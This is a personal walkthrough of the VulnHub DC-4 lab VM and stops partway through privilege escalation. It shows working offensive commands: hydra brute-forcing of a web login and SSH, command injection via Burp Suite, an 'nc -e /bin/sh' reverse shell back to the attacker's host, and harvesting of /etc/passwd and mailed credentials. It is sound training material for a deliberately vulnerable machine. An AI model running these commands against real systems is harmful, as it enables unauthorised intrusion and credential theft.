# DC: 4
[VulnHub link](https://www.vulnhub.com/entry/dc-4,313/)  
By DCAU

* As with the first 3 iterations of the DC-series, we are first greeted with a login page that requires users to specify both the username and the password:
![](/screenshots/dc-4/loginInitial.jpg)
* Common login credentials such as `admin:admin` and `admin:password` do not work.
* Run `nmap 10.0.2.*`, where we find 5 live hosts:
![](/screenshots/dc-4/nmapScan.jpg)
* After eliminating our own IP address and our router gateway IP address, it is very likely that the vulnerable VM's IP address is `10.0.2.10`.
* The host is running 2 services, SSH at port 22 and HTTP at port 80. Both ports are found to be open.
* Run `nmap -p- -A 10.0.2.10`:
![](/screenshots/dc-4/hostFullScan.jpg)
* Looking at the services which the vulnerable VM is running, we can see an nginx web server running on port 80 (which is open). This is the first time that we have encountered a non-Apache web server - not that it makes any difference (I think?).
* Opening `http://10.0.2.10` reveals a site with only an "Admin Information Systems Login":
![](/screenshots/dc-4/siteWebServer.jpg)
* Common login credentials such as `admin:admin` and `admin:password` do not work. Moreover, any invalid attempts does not result in an error message being displayed. Instead, the 2 user input text fields are simply emptied. The page is also changed to `http://10.0.2.10/index.php`.
* The page source does not reveal anything of interest, and the robots.txt page does not exist (404 Not Found).
* The page is running on php - perhaps it could be a WordPress site? I tried to load `http://10.0.2.10/wp-login.php`, but was greeted with the message "No input file specified.". Hmm, interesting. It seems to be expecting a file at the login page?
* I attempted a `wpscan` command against the web server but it did not detect the site's CMS as WordPress.
* Running `whatweb -v 10.0.2.10` also did not tell us what CMS the site was on, except information that we had already known before (e.g. nginx version):
![](/screenshots/dc-4/whatweb.jpg)
* Note: `whatweb` is a web scanner that identifies technologies used by websites.
* Time to find out what other pages or directories that we can access from the site - I tried using `uniscan` but it only gave 2 results which renders the same login page that greeted us.
![](/screenshots/dc-4/uniscan.jpg)
* Using `dirbuster`, we did not find out much additional useful information - the only page with 200 OK is what we already know. The rest of the pages attempted lead to either a 403 Forbidden or 302 Redirect.
![](/screenshots/dc-4/dirbuster.jpg)
* Without making much of a headway, I decided that we will use a dictionary attack against the login page, using `hydra`: `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.10 http-post-form '/login.php:username=^USER^&password=^PASS^:S=Logout'`:
![](/screenshots/dc-4/hydraAdmin.jpg)
* I had several issues with running the command here, though I had already used it in 2 walkthroughs previously. The first issue was that instead of `login.php`, I was using `index.php` which did not work. I am rather puzzled as to why this is the case because `dirbuster` told us that accessing the former would result in an indirect to the latter. Accessing the former itself would also result in the same.
* Note: We discovered earlier that accessing `10.0.2.10` itself did not result in a redirect to `http://10.0.2.10/index.php`. Only an invalid login attempt did so. When logging in with `admin:happy`, entering the set of credentials brought us again to `index.php` first, where we had to enter the set of credentials again. So, I decided to head straight to `index.php` and enter the set of credentials, but again I was forced to enter it a second time. Heading straight to `login.php` also required me to log in twice. The mystery behind what puzzled me is still not solved, I guess.
* Note2: Perhaps having to log in twice is a mechanism to defeat brute-force/dictionary attacks, but `login.php` somehow works.
* The second issue was that I did not know what to expect upon a successful log in, i.e. what texts there would be. I was trying out words such as Welcome, and instead of Logout, I was trying Log Out (with a whitespace) instead.
* Note that we also had to make a guess with the username `admin` because an invalid login did not reveal to us if the attempted username even existed.
* This is the page that greets us after logging in:
![](/screenshots/dc-4/adminLogin.jpg)
* Note: There are not a lot of words in the page, so your word/phrase that detects for a successful login in your `hydra` command must have been accurate.
* Clicking on `Command` brings us to a list of 3 commands which we can run:
![](/screenshots/dc-4/systemToolsCommands.jpg)
* Running each of the command is equivalent to running the respective versions of the command in Unix:
![](/screenshots/dc-4/systemToolsCommandsExecution.jpg)
* Looking at the `ls -l` command that was executed, we see that the owner and group of all of the listed files and directories is `root`.
* Since we appear to be executing commands from a GUI, I am guessing that we would be able to post our own requests (i.e. commands).
* This is the first time that I am using Burp Suite - we have to first configure the Firefox browser's proxy settings under Network settings, and ensure that both the browser and the tool are using the same IP address (e.g. 127.0.0.1) and port (e.g. 8080) for the interception by Burp Suite to work.
* We will now capture and intercept the request when we execute `ls -l`:
![](/screenshots/dc-4/burpSuitels.jpg)
* We see that the `ls -l` command is sent under the `radio` parameter.
* Since we are intercepting the request, let us now modify the command string to confirm the fact that we are actually sending commands to the web server. I have changed it to `pwd`, before pressing `Forward` to find out what our current working directory is:
![](/screenshots/dc-4/burpSuitepwd.jpg)
* So indeed it appears that we are able to send our own commands! We are currently at `/usr/share/nginx/html`.
* We will attempt to get a reverse shell through a connection using `nc 10.0.2.15 1234 -e /bin/sh` on the web server, and `nc -v -l -p 1234` in our own Kali VM terminal to catch the connection:
![](/screenshots/dc-4/burpSuitenc.jpg)
* Note: `10.0.2.15` is my Kali VM's IP address. Use `ifconfig` to find out yours.
* `whoami` reveals that we are `www-data` as expected.
* Run `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn our interactive TTY shell.
* Next, I ran `find / -user root -perm -4000 -print 2>/dev/null` to search for setuid binaries which we could possibly exploit, but nothing quite stood out to me:
![](/screenshots/dc-4/setuidBinaries.jpg)
* I looked into the `/etc/passwd` to find out if there was useful information that we could extract, and found that there were 3 users that we did not know before (`charles`, `jim` and `sam`):
![](/screenshots/dc-4/etcPasswdUserList.jpg)
* Heading to the `/home` directory, we found 3 directories belonging to these users respectively:
![](/screenshots/dc-4/homeDirectory.jpg)
* There is not much that is of interest to us in the respective directories as shown:
![](/screenshots/dc-4/homeDirectoryContents.jpg)
* `test.sh` seems cryptic:
![](/screenshots/dc-4/testScript.jpg)
* The only other file that caught my attention is `old-passwords.bak`, which has a wordlist of 252 lines:
![](/screenshots/dc-4/oldPasswords.jpg)
* The wordlist could contain the password to user `jim`, since it was found under his directory.
* We will next attempt a dictionary attack on the 3 users with `hydra` once again. I used Burp Suite to download the wordlist by changing the request parameters to `radio=cat /home/jim/backups/old-passwords.bak&submit=Run`:
![](/screenshots/dc-4/oldPasswordsBak.jpg)
* Run `hydra -L users.txt -P passwords.txt 10.0.2.10 ssh`, where we see that a set of credentials belonging to `jim` has been found:
![](/screenshots/dc-4/hydraJim.jpg)
* Note: `users.txt` consist of charles, jim and sam, while `passwords.txt` contains the wordlist from `old-passwords.bak`. Since we are finding the credentials for ssh, including it in the command will simply do the trick.
* The password `jibril04` was found towards the end of the user list, hence it took awhile for `hydra` to give us our result.
* We log in with `jim:jibril04`, running `ssh jim@10.0.2.10`, and we are in:
![](/screenshots/dc-4/sshJim.jpg)
* There was a file mbox that we did not have permissions to open previously:
![](/screenshots/dc-4/jimmbox.jpg)
* The file contains an email from `root` to `jim`, with a test message. I was pretty much stuck at this point in time because I was not quite sure what the mail was telling us. I did not find any information from the mail itself that appeared useful.
* I found out from other walkthroughs that we should check out `/var/mail`, because a mail server is likely to be (or had been) running given that an email was sent. Interesting, I have learnt something new here.
* There is only 1 file `jim` in the directory. Opening it, we see the password for user `charles` in an email sent from him:
![](/screenshots/dc-4/jimMail.jpg)
* Now we have one more set of credentials: `charles:^xHhA&hvim0y`.
* We can either exit from `jim` and enter `ssh charles@10.0.2.10`, or continue with `jim` and run `su charles`:
![](/screenshots/dc-4/sshCharles.jpg)
* There are no noteworthy files in charles' home directory, so we will have to think of a way to escalate our privileges.
* I recalled in dc-2 that besides the command that we used earlier to find setuid binaries (but to no avail), we could also run `sudo -l` to find out what commands we can run as root in the current capacity:
![](/screenshots/dc-4/sudoCommands.jpg)
* It turns out that we can run `/usr/bin/teehee` as root.
* The confusion that I had was that I did not know exactly what `teehee` did. I ran the file and found that whatever I typed was repeated back to me. I typed in various commands but to no avail.
* I ran `strings teehee` and found a whole lot of text within the file. I had also found that we could run `./teehee --help` to find out what it was exactly doing:
![](/screenshots/dc-4/teeheeHelp.jpg)
* To-be-continued...

# Other walkthroughs visited
1. https://s1gh.sh/vulnhub-dc-4/